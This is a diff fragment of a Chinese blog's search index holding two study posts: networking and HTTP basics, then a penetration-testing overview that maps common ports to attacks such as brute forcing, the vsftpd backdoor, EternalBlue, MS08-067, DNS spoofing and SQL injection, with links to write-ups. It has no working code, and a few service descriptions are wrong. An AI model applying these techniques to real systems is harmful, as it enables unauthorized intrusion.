+<li>本地询问询问权威DNS服务器</li>
+<li>权威dns服务器将对应的ip地址告诉本地</li>
+<li>本地dns返回ip地址给客户端，建立连接</li>
+</ol>
+<h3 id="ARP与RARP协议："><a href="#ARP与RARP协议：" class="headerlink" title="ARP与RARP协议："></a>ARP与RARP协议：</h3><p>解析IP所在的MAC地址；主机通过广播发送ARP请求，包含想要知道的MAC地址的主机IP地址。同一链路的所有设备收到ARP请求时，如果拆开ARP请求包中的内容，目标IP和自己的IP一致，该设备就将自己的MAC地址塞入ARP响应包返回给主机。操作系统会缓存ARP获得的MAC地址；超过一定期限，，缓存内容被清除</p>
+<p>解析MAC地址的IP（需要架设以太RAPR服务器，在该服务器上注册设备的MAC地址和IP地址，设备会发送自己的MAC地址，RARP收到该消息会返回MAC地址为xxx的IP地址为xxx）；</p>
+<h3 id="DHCP协议："><a href="#DHCP协议：" class="headerlink" title="DHCP协议："></a>DHCP协议：</h3><p>动态获取IP协议；</p>
+<ol>
+<li><p>客户端发起 ==DHCP发现报文（DHCP DISCOVER)== 的 IP数据包,没有ip地址，不知道dhcp服务器的地址，使用UDP广播通信，目的地址255.255.255.255（端口：67）使用0.0.0.0（68端口）作为源IP地址；dhcp客户端将该IP数据传给链路层，然后将帧广播到所有网络设备中。</p>
+</li>
+<li><p>dhcp服务器收到 DHCP 发现报文后，用==DHCP提供报文（DHCP OFFER）==向客户端做出响应。任然使用IP广播地址255.255.255.255，该报文信息携带服务器可租约的IP地址，子网掩码，默认网关，dns服务器以及ip地址租用期。</p>
+</li>
+<li><p>客户收到一个或多个服务器的DHCP提供报文后，选择一个服务器，发送==FHCP请求报文(DHCP REQUEST)==进行响应，回显配置的参数</p>
+</li>
+<li><p>服务端最后用==DHCP ACK报文==对DHCP请求报文进行响应。</p>
+<p>全程使用udp广播通信。不在同一个局域网的话，DHCP中继代理，对不同网段的IP地址分配可以由一个DHCP服务器进行统一管理。</p>
+</li>
+</ol>
+<h3 id="NAT："><a href="#NAT：" class="headerlink" title="NAT："></a>NAT：</h3><p>网络地址转换协议；进阶NAPT；ip地址+端口号；可以将私有地址转为公有地址，以不同的端口号进行区分。</p>
+<h3 id="ICMP协议："><a href="#ICMP协议：" class="headerlink" title="ICMP协议："></a>ICMP协议：</h3><p>互联网控制报文。</p>
+<p>主要功能：确认IP是否成功送达目标地址，报告发送过程中被废弃的原因和改善网络设置等等。</p>
+<p>1.查询报文类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0	回送应答</span><br><span class="line">8	回送请求</span><br></pre></td></tr></table></figure>
+<p>2.差错报文</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3	目标不可达</span><br><span class="line">4	源点抑制</span><br><span class="line">5	重定向或改变路由</span><br><span class="line">11	超时</span><br></pre></td></tr></table></figure>
+<h1 id="HTTP介绍："><a href="#HTTP介绍：" class="headerlink" title="HTTP介绍："></a>HTTP介绍：</h1><p>http是超文本传输协议；Hypertext  TransferProtocol</p>
+<p>分为三个部分：超文本；传输；协议；</p>
+<h2 id="协议："><a href="#协议：" class="headerlink" title="协议："></a>协议：</h2><p>http是一个用在计算机世界里的协议。它使用计算机能够理解的语言确立了一种计算机之间交流的规范，以及相关的各种控制和错误处理方式。</p>
+<h2 id="传输："><a href="#传输：" class="headerlink" title="传输："></a>传输：</h2><p>数据利用http协议进行传输，由浏览器进行渲染，就可以看见图片，视频。</p>
+<h2 id="超文本："><a href="#超文本：" class="headerlink" title="超文本："></a>超文本：</h2><p>http传输的内容就是超文本。</p>
+<p><strong>总结：HTTP是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</strong></p>
+<h2 id="URL："><a href="#URL：" class="headerlink" title="URL："></a>URL：</h2><p>统一资源定位符；具有标准的语法；其中https端口会默认省略是443；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protocol://[[user[:password]@]host[:port]][/path][?query][#fragment]</span><br><span class="line"></span><br><span class="line">[协议名]://[用户名]:[密码]@[主机名]:[端口]/[路径]?[查询参数]#[片段ID]</span><br><span class="line">protocol：指定使用的传输协议，最常用的是通过 HTTP/HTTPS 协议来定位网络资源。</span><br><span class="line">          mailto: 用户打开邮箱的客户端</span><br><span class="line">          ftp: 用来做文件的转换</span><br><span class="line">          file: 用来获取文件</span><br><span class="line">user:password 需要认证后才能访问时的账号密码。</span><br><span class="line">host：表示合法的因特网主机域名或者IP地址。</span><br><span class="line">port：用于表示在传输层上交换信息的进程端口号，标明了获取服务器资源的入口,</span><br><span class="line">      http协议默认端口号为80，不同的协议默认端口号不同。</span><br><span class="line">path：指定请求服务器上资源的路径。</span><br><span class="line">?query：可选，用于给动态网页传递参数，可以有多个参数，用&quot;&amp;&quot;符号隔开，每个参数的键值之间用&quot;=&quot;隔开。</span><br><span class="line">#fragment：信息片断字符串，用于指定网络资源中的片断。例如一个网页中有多个名词解释，可使用fragment直接定位到某一名词解释。</span><br><span class="line">例：</span><br><span class="line">https://en.wikipedia.org:443/wiki/Hypertext_Transfer_Protocol?id=123#HTTP/1.1_response_messages</span><br></pre></td></tr></table></figure>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240522133715771.png" alt="image-20240522133715771"></p>
+<h2 id="URI："><a href="#URI：" class="headerlink" title="URI："></a>URI：</h2><p>统一资源标识符；用来标识抽象字符或物理资源的一个紧凑字符串。</p>
+<p>http使用统一资源标识符URI 来传输数据和建立连接</p>
+<p>同样差不多的是URN,统一资源名称，通过特定命名空间中的唯一名称或id来标识资源</p>
+<h2 id="Request："><a href="#Request：" class="headerlink" title="Request："></a>Request：</h2><p>包含四个部分：请求行；请求头部；空行；请求正文；每部分使用\r\n（CRLF //回车符，换行符）分隔开</p>
+<h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method Request-URI HTTP-Version CRLF</span><br><span class="line"></span><br><span class="line">Method：表示请求方法;</span><br><span class="line">Request-URI：是一个统一资源标识符;</span><br><span class="line">HTTP-Version：表示请求的HTTP协议版本;</span><br><span class="line">CRLF：表示回车和换行</span><br></pre></td></tr></table></figure>
+<p>请求方法：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">请求获取Request-URI所标识的资源</span></span><br><span class="line"></span><br><span class="line"><span class="string">POST</span> <span class="string">在Request-URI所标识的资源后附加新的数据</span></span><br><span class="line"><span class="comment">#get post是最常见的请求；</span></span><br><span class="line"><span class="string">HEAD</span> <span class="string">请求获取由Request-URI所标识的资源的响应消息报头</span></span><br><span class="line"></span><br><span class="line"><span class="string">PUT</span> <span class="string">请求服务器存储一个资源，并用Request-URI作为其标识</span></span><br><span class="line"></span><br><span class="line"><span class="string">DELETE</span> <span class="string">请求服务器删除Request-URI所标识的资源</span></span><br><span class="line"><span class="comment">#put，delete只要存在就可能出问题；可能存在任意文件上传，删除</span></span><br><span class="line"><span class="string">TRACE</span> <span class="string">请求服务器回送收到的请求信息，主要用于测试或诊断</span></span><br><span class="line"></span><br><span class="line"><span class="string">OPTIONS</span> <span class="string">请求查询服务器的性能，或者查询与资源相关的选项和需求</span></span><br><span class="line"></span><br><span class="line"><span class="string">CONNECT</span> <span class="string">保留将来使用，HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器</span></span><br><span class="line"></span><br><span class="line"><span class="string">PATCH</span> <span class="string">用于将局部修改应用到资源。（由</span> <span class="string">RFC</span> <span class="number">5789</span> <span class="string">指定的方法）</span></span><br></pre></td></tr></table></figure>
+<h3 id="请求头部字段"><a href="#请求头部字段" class="headerlink" title="请求头部字段"></a>请求头部字段</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有的的</span></span><br><span class="line"><span class="string">https://tools.jb51.net/table/http_content_type</span></span><br><span class="line"><span class="string">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers</span></span><br></pre></td></tr></table></figure>
+<p>常见字段：</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240522134529886.png" alt="image-20240522134529886"></p>
+<p>1）Host：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Host:</span> <span class="string">www.A.com</span></span><br><span class="line"><span class="string">指定服务器的域名</span></span><br><span class="line"><span class="comment">#host碰撞漏洞</span></span><br></pre></td></tr></table></figure>
+<p>2）Content-Length</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Content-Length:&amp;nbsp;1000</span></span><br><span class="line"><span class="string">表明本次回应的数据长度</span></span><br><span class="line"><span class="comment">#不存在漏洞</span></span><br></pre></td></tr></table></figure>
+<p>3）Connection</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Connection:&amp;nbsp;keep-alive</span></span><br><span class="line"><span class="string">常用于客户端要求服务器使用TCP持久连接，以便其它请求复用</span></span><br><span class="line"><span class="string">https默认持久连接，为了兼容老版本，需要指定首部为keep-Alive</span></span><br><span class="line"><span class="string">Connection:&amp;nbsp;keep-alive</span></span><br></pre></td></tr></table></figure>
+<p>4）Content-Type</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">用于服务器回应时；告诉客户端，本次数据格式</span></span><br><span class="line"><span class="string">Content-Type:&amp;nbsp;text/html;&amp;nbsp;charset=utf-8</span></span><br><span class="line"><span class="string">客户端请求时；可以使用Accept声明接受那些数据格式</span></span><br><span class="line"><span class="string">Accept:&amp;nbsp;*/*</span></span><br></pre></td></tr></table></figure>
+<p>5）Content-Encodeing</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">说明数据的压缩方法，表明服务器返回数据使用了什么压缩格式</span></span><br><span class="line"><span class="string">Content-Encoding:&amp;nbsp;gzip</span></span><br><span class="line"><span class="string">客户端请求时；可以使用Accept-Encoding声明接受那些数据格式</span></span><br><span class="line"><span class="string">Accept-Encoding:&amp;nbsp;gzip,&amp;nbsp;deflate</span></span><br></pre></td></tr></table></figure>
+<p>6)Origin</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指名当前请求来自哪个站点</span><br><span class="line">存在csrf漏洞</span><br></pre></td></tr></table></figure>
+<p>7）Referer</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先前网站的地址；当前请求网页紧跟其后</span><br></pre></td></tr></table></figure>
+<h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><p>表示请求头结束，请求正文开始</p>
+<h3 id="请求正文"><a href="#请求正文" class="headerlink" title="请求正文"></a>请求正文</h3><p>get方法提交数据时，数据参数会作为url的一部分，放在文件路径后面发送给服务器，称为查询字符串</p>
+<h2 id="Responce："><a href="#Responce：" class="headerlink" title="Responce："></a>Responce：</h2><p>包含四个部分：状态行；消息报头；空行；响应正文；</p>
+<h3 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP-Version Status-Code Reason-Phrase CRLF</span><br><span class="line"></span><br><span class="line">HTTP-Version：表示服务器HTTP协议的版本；</span><br><span class="line">Status-Code：表示服务器发回的响应状态代码；</span><br><span class="line">Reason-Phrase：表示状态代码的文本描述。</span><br></pre></td></tr></table></figure>
+<p>包含五大状态码：</p>
+<p>1xx：基本看不见。协议处理的中间状态</p>
+<p>2xx：成功处理了客户端的请求</p>
+<p>3xx：重定向 301；永久重定向  302；临时重定向 304；不具有跳转的含义；读取浏览器缓存</p>
+<p>4xx：客户端发送的报文有误；403：禁止访问  404：访问不存在</p>
+<p>5xx:服务器错误</p>
+<h3 id="响应头部字段"><a href="#响应头部字段" class="headerlink" title="响应头部字段"></a>响应头部字段</h3><p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240522162932923.png" alt="image-20240522162932923"></p>
+<h3 id="空行-1"><a href="#空行-1" class="headerlink" title="空行"></a>空行</h3><p>表示响应头结束，响应正文开始</p>
+<h3 id="响应正文"><a href="#响应正文" class="headerlink" title="响应正文"></a>响应正文</h3><p>服务器返回的资源内容</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>http和https区别：</p>
+<p>https加入了ssl/tls安全协议，报文能够加密传输</p>
+<p>http连接建立相对简单，</p>
+<p>端口号不同80  、443</p>
+<p>https需要向ca（证书权威机构）申请数字证书</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>日记</tag>
+        <tag>渗透</tag>
+        <tag>计算机网络基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透日记之端口利用</title>
+    <url>/posts/e36ab591.html</url>
+    <content><![CDATA[<h1 id="黑客常用端口利用总结"><a href="#黑客常用端口利用总结" class="headerlink" title="黑客常用端口利用总结"></a>黑客常用端口利用总结</h1><h2 id="常见端口渗透"><a href="#常见端口渗透" class="headerlink" title="# 常见端口渗透"></a><a href="https://edu.yijinglab.com/post/280#常见端口渗透">#</a> 常见端口渗透</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th style="text-align:left"><strong>攻击技巧</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21/22/69</td>
+<td>ftp/tftp：文件传输协议</td>
+<td style="text-align:left">爆破、嗅探、溢出、后门</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh：远程连接</td>
+<td style="text-align:left">爆破、OpenSSH、28个退格</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet：远程连接</td>
+<td style="text-align:left">爆破、嗅探</td>
+</tr>
+<tr>
+<td>25</td>
+<td>smtp：邮件服务</td>
+<td style="text-align:left">邮件伪造</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS：域名解析系统</td>
+<td style="text-align:left">DNS区域传输、DNS劫持、DNS缓存投毒、DNS欺骗、深度利用（利用DNS隧道技术刺透防火墙）</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>dhcp：动态主机配置</td>
+<td style="text-align:left">劫持、欺骗</td>
+</tr>
+<tr>
+<td>110</td>
+<td>pop3：邮件协议</td>
+<td style="text-align:left">爆破</td>
+</tr>
+<tr>
+<td>139</td>
+<td>samba服务：linux系统应用Microsoft网络通讯协议的软件，<strong>用于Linux与windows系统直接的文件共享和打印共享</strong></td>
+<td style="text-align:left">爆破、未授权访问、远程代码执行</td>
+</tr>
+<tr>
+<td>143</td>
+<td>lmap：交互式邮件存取协议</td>
+<td style="text-align:left">爆破</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp：简单邮件传输协议</td>
+<td style="text-align:left">爆破</td>
+</tr>
+<tr>
+<td>389</td>
+<td>ldap：轻量目录访问</td>
+<td style="text-align:left">注入攻击、未授权访问</td>
+</tr>
+<tr>
+<td>445</td>
+<td>smb：win 共享文件</td>
+<td style="text-align:left">ms17-010/端口溢出</td>
+</tr>
+<tr>
+<td>512/513/514</td>
+<td>linux rexec服务</td>
+<td style="text-align:left">直接使用rlogin</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync</td>
+<td style="text-align:left">文件上传/未授权访问</td>
+</tr>
+<tr>
+<td>1080</td>
+<td>socket</td>
+<td style="text-align:left">爆破（进行内网渗透）</td>
+</tr>
+<tr>
+<td>1352</td>
+<td>lotus domino邮件服务</td>
+<td style="text-align:left">爆破（弱口令）、信息泄露（源代码）</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>mssqlserver</td>
+<td style="text-align:left">爆破（使用系统用户登陆）、注入攻击</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>oracle</td>
+<td style="text-align:left">爆破（TNS）、注入攻击</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>nfs：linux文件共享</td>
+<td style="text-align:left">配置不当</td>
+</tr>
+<tr>
+<td>2181</td>
+<td>zookeeper</td>
+<td style="text-align:left">未授权访问</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql</td>
+<td style="text-align:left">爆破、拒绝服务、注入</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>Rdp远程桌面连接</td>
+<td style="text-align:left">爆破、shift后门</td>
+</tr>
+<tr>
+<td>4848</td>
+<td>glassflsh控制台</td>
+<td style="text-align:left">爆破（控制台弱口令）、认证绕过</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>sybase/DB2数据库</td>
+<td style="text-align:left">爆破、注入</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>postgresql</td>
+<td style="text-align:left">缓冲区溢出、注入攻击、爆破（弱口令）</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>pcanywhere</td>
+<td style="text-align:left">拒绝服务、代码执行</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>vnc</td>
+<td style="text-align:left">爆破（弱口令）、认证绕过</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>redis</td>
+<td style="text-align:left">未授权访问、爆破（弱口令）</td>
+</tr>
+<tr>
+<td>7001/7002</td>
+<td>weblogic</td>
+<td style="text-align:left">java反序列化、控制台弱口令、控制台部署webshell</td>
+</tr>
+<tr>
+<td>80/443/8080</td>
+<td>web</td>
+<td style="text-align:left">常见web攻击、控制台爆破、对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td>8069</td>
+<td>zabbix</td>
+<td style="text-align:left">远程命令执行</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>websphere控制台</td>
+<td style="text-align:left">爆破（控制台弱口令）、java反序列</td>
+</tr>
+<tr>
+<td>9200/9300</td>
+<td>elasticsearch</td>
+<td style="text-align:left">远程代码执行</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>memcache/memcached</td>
+<td style="text-align:left">未授权访问</td>
+</tr>
+<tr>
+<td>27017/27018</td>
+<td>mongodb</td>
+<td style="text-align:left">爆破、未授权访问</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="端口渗透剖析"><a href="#端口渗透剖析" class="headerlink" title="# 端口渗透剖析"></a><a href="https://edu.yijinglab.com/post/280#端口渗透剖析">#</a> 端口渗透剖析</h2><h3 id="21"><a href="#21" class="headerlink" title="# 21"></a><a href="https://edu.yijinglab.com/post/280#21">#</a> 21</h3><p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。</p>
+<p>（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。</p>
+<p>（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱</p>
+<p>（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（<a href="https://www.freebuf.com/column/143480.html）">https://www.freebuf.com/column/143480.html）</a></p>
+<p>（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。</p>
+<p>（5）ftp远程代码溢出。（<a href="https://blog.csdn.net/weixin_42214273/article/details/82892282）">https://blog.csdn.net/weixin_42214273/article/details/82892282）</a></p>
+<p>（6）ftp跳转攻击。（<a href="https://blog.csdn.net/mgxcool/article/details/48249473）">https://blog.csdn.net/mgxcool/article/details/48249473）</a></p>
+<h3 id="22"><a href="#22" class="headerlink" title="# 22"></a><a href="https://edu.yijinglab.com/post/280#22">#</a> 22</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
+<p>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。</p>
+<p>（2）防火墙SSH后门。（<a href="https://www.secpulse.com/archives/69093.html）">https://www.secpulse.com/archives/69093.html）</a></p>
+<p>（3）28退格 OpenSSL</p>
+<p>（4）openssh 用户枚举 CVE-2018-15473。（<a href="https://www.anquanke.com/post/id/157607）">https://www.anquanke.com/post/id/157607）</a></p>
+<h3 id="23"><a href="#23" class="headerlink" title="# 23"></a><a href="https://edu.yijinglab.com/post/280#23">#</a> 23</h3><p>telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。</p>
+<p>（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。</p>
+<p>（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。</p>
+<h3 id="25-465"><a href="#25-465" class="headerlink" title="# 25/465"></a><a href="https://edu.yijinglab.com/post/280#25465">#</a> 25/465</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件</p>
+<p>默认端口：25（smtp）、465（smtps）</p>
+<p>（1）爆破：弱口令</p>
+<p>（2）未授权访问</p>
+<h3 id="53"><a href="#53" class="headerlink" title="# 53"></a><a href="https://edu.yijinglab.com/post/280#53">#</a> 53</h3><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。</p>
+<p>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（<a href="https://www.seebug.org/vuldb/ssvid-96718）">https://www.seebug.org/vuldb/ssvid-96718）</a></p>
+<p>（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（<a href="https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）">https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）</a></p>
+<p>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（<a href="http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）">http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）</a></p>
+<p>（4）DNS劫持。（<a href="https://blog.csdn.net/qq_32447301/article/details/77542474）">https://blog.csdn.net/qq_32447301/article/details/77542474）</a></p>
+<h3 id="80"><a href="#80" class="headerlink" title="# 80"></a><a href="https://edu.yijinglab.com/post/280#80">#</a> 80</h3><p>80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL注入的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。</p>
+<p>（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。</p>
+<p>（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。</p>
+<p>（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。</p>
+<p>（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。</p>
+<p>（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。</p>
+<p>（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。</p>
+<p>（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。</p>
+<h3 id="135"><a href="#135" class="headerlink" title="# 135"></a><a href="https://edu.yijinglab.com/post/280#135">#</a> 135</h3><p>135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:</p>
+<p>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（<a href="https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）">https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）</a></p>
+<p>（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（<a href="https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）">https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）</a></p>
+<h3 id="139-445"><a href="#139-445" class="headerlink" title="# 139/445"></a><a href="https://edu.yijinglab.com/post/280#139445">#</a> 139/445</h3><p>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</p>
+<p>（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（<a href="https://blog.csdn.net/qq_41880069/article/details/82908131）">https://blog.csdn.net/qq_41880069/article/details/82908131）</a></p>
+<p>（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（<a href="https://blog.csdn.net/god_7z1/article/details/6773652）">https://blog.csdn.net/god_7z1/article/details/6773652）</a></p>
+<p>（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（<a href="https://blog.warhut.cn/dmbj/145.html）">https://blog.warhut.cn/dmbj/145.html）</a></p>
+<p>（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</p>
+<h3 id="1433"><a href="#1433" class="headerlink" title="# 1433"></a><a href="https://edu.yijinglab.com/post/280#1433">#</a> 1433</h3><p>1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP/IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。</p>
+<p>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（<a href="https://blog.csdn.net/gxj022/article/details/4593015）">https://blog.csdn.net/gxj022/article/details/4593015）</a></p>
+<p>（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（<a href="https://blog.csdn.net/kali_linux/article/details/50499576）">https://blog.csdn.net/kali_linux/article/details/50499576）</a></p>
+<p>（3）嗅探技术同样能嗅探到SQL Server的登录密码。</p>
+<p>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。</p>
+<h3 id="1521"><a href="#1521" class="headerlink" title="# 1521"></a><a href="https://edu.yijinglab.com/post/280#1521">#</a> 1521</h3><p>1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：</p>
+<p>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。</p>
+<p>（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</p>
+<p>（3）在注入点直接创建java，执行系统命令。</p>
+<p>（4）<a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</a></p>
+<h3 id="2049"><a href="#2049" class="headerlink" title="# 2049"></a><a href="https://edu.yijinglab.com/post/280#2049">#</a> 2049</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
+<p>未授权访问。（<a href="https://www.freebuf.com/articles/network/159468.html）">https://www.freebuf.com/articles/network/159468.html）</a> (<a href="http://www.secist.com/archives/6192.htm">http://www.secist.com/archives/6192.htm</a>)</p>
